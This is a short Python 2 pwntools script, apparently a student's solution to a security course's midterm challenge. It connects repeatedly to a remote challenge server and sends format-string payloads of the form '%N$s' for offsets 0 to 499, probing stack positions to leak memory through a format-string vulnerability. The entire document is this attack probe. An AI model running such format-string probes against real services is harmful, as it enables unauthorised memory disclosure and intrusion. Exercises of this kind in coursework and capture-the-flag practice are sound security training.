from pwn import *

i = 0
while (i<500):
	c = remote("midsem.6447.sec.edu.au", 8021)
	payload = "%" + str(i) + "$" + "s"
	print payload
	c.sendline(payload)
	c.interactive()
	c.close()
	i+=1

